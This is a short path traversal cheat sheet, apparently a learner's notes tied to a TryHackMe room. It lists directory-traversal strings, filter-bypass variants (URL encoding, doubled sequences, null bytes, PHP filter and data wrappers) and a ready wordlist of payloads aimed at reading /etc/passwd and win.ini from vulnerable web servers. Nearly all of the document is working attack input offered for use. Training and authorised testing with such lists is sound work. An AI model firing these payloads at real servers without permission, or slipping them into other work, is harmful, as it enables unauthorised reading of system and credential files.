# Path Traversal Cheat Sheet
___
#### Common Method
```txt
../../../etc/passwd >> For linux

..\..\..\windows\win.ini >> For windows
```
#### Bypassing Defence Mechanism
Sequence block bypass >> ....//....//....//....//etc/passwd
Sequence block bypass2 >> ..//..//..//..//etc/passwd
Encoding ../ >> %2e%2e%2f
Absolute path >> /var/www/images/../../../etc/passwd
Absolute path2 >> /var/www/html/..//..//..//etc/passwd
Using null byte >> ../../../etc/passwd%00.png
Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
Using Data wrappers >> data:text/plain,<?php phpinfo(); ?>
#### Wordlist
```txt
../../../etc/passwd
..//..//..//..//etc/passwd
....//....//....//....//etc/passwd
/var/www/images/../../../etc/passwd
/var/www/images/..//..//..//..//etc/passwd
/var/www/images/....//....//....//....//etc/passwd
../../../etc/passwd%00.php
..//..//..//..//etc/passwd%00.php
....//....//....//....//etc/passwd%00.php
/var/www/images/../../../etc/passwd%00.php
/var/www/images/..//..//..//..//etc/passwd%00.php
/var/www/images/....//....//....//....//etc/passwd%00.php
%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd
```
## To learn
https://tryhackme.com/r/room/filepathtraversal
